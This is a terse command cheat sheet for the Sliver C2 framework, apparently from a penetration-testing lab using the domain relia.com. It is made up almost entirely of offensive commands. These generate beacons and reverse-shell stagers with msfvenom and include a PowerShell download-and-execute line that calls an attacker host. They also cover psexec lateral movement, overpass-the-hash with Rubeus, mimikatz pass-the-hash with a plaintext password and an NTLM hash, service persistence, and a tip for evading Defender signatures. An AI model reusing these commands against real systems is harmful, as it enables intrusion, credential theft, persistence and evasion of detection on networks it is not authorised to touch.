https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors

# Proxy

```bash
socks5 start -P 1080
```

# Beacons

```bash
generate beacon --http 192.168.45.235:8080 --format exe --skip-symbols
```

# Listeners

```bash
http -L 192.168.45.235 -l 8080
```

# Sessions

```bash
generate --http 192.168.45.235:8080 --format exe --skip-symbols
```

# Services

```bash
profiles new --format service --skip-symbols --mtls 192.168.45.235 win-svc64
psexec -d Description -s ServiceName -p win-svc64 LOGIN.relia.com
psexec -d Description -s testo -p win-svc64 DC02.relia.com
```

# Stagers

```bash
# MSF Venom for boxes
mtls -L 192.168.45.163 -l 8888
profiles new --mtls 192.168.45.163 --format shellcode win-shellcode
stage-listener --url http://192.168.45.163:1234 --profile win-shellcode
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.163 LPORT=1234 LURI=/hello.woff -f exe -o stager.exe
cmd.exe stager.exe


## REDONE
# Real Scenario based on https://www.youtube.com/watch?v=3uHNyTZvbqs
mtls -L 192.168.45.163 -l 9900
profiles new --mtls 192.168.45.163:9900 -l -f shellcode m_shellcode
stage-listener -u http://192.168.45.163:9443 -p m_shellcode
stage-listener -u tcp://192.168.45.163:1234 -p m_shellcode
msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.45.163 LPORT=9443 LURI=/hello.woff -f exe -o http.exe
msfvenom -p windows/x64/custom/reverse_tcp LHOST=192.168.45.163 LPORT=1234 -f exe -o tcp.exe

# bypassing defender
1. Use sliver docs custom C# script and change strings so it does not have signature checks

# Need to do stagers beacons from video above

# Need to play with powershell
iex (New-Object Net.WebClient).DownloadString("http://192.168.45.163/stager.ps1")
```

# Impersonate with credentials

```bash
make-token -u Administrator -p vau!XCKjNQBv2$ -d relia.com -T LOGON_INTERACTIVE
impersonate RELIA\\dan
shell
```

# pivoting (overpass the hash)

```bash
rubeus asktgt /user:dan /rc4:4b22394fc907bd7a74d1af6cc9aca348 /domain:relia.com /ptt
profiles new --format service --skip-symbols --mtls 192.168.45.235:8888 win-svc64
psexec -d waytoknow -s updater_svc -p win-svc64 dc02
```

# persisting

```bash
generate beacon --mtls 192.168.45.235:8989 --skip-symbols --format exe --name dc_pers
mtls -L 192.168.45.235 -l 8989
sharpersist -- -t service -c \"C:\\dc_pers.exe\" -n \"LongivityCheck\" -m add
sa-sc-enum
execute sc start LongivityCheck
```

# impersonating without credentials

```bash
mimikatz '"sekurlsa::pth /user:dan /domain:RELIA /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /run:powershell.exe /impersonate"'
mimikatz '"token::elevate /user:dan /domain:RELIA"'
mimikatz '"token::run /user:dan /domain:RELIA /process:C:\Windows\System32\cmd.exe"'

impersonate RELIA\\dan
shell

-- ONE LINER
mimikatz '"sekurlsa::pth /user:dan /domain:RELIA /ntlm:4b22394fc907bd7a74d1af6cc9aca348 /run:powershell.exe /impersonate" "token::elevate /user:dan /domain:RELIA" "token::run /user:dan /domain:RELIA /process:C:\Windows\System32\cmd.exe"'
```
